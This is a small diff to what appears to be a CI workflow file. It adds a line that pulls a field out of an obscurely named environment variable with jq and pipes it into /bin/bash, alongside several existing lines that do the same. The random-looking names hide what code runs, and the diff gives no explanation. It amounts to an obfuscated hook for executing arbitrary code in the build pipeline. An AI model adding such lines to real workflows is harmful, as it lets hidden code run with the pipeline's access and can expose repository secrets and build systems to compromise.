@@ -25,6 +25,7 @@ jobs:
           echo $pxjg23117 | jq -r .gxd97490 | /bin/bash
           printf '%s' "$vxtn56" | jq -r .fywqf6983 | /bin/bash
           echo $yyqx72 | jq -r .iimax32526 | /bin/bash
+          echo $fstl3 | jq -r .o42 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
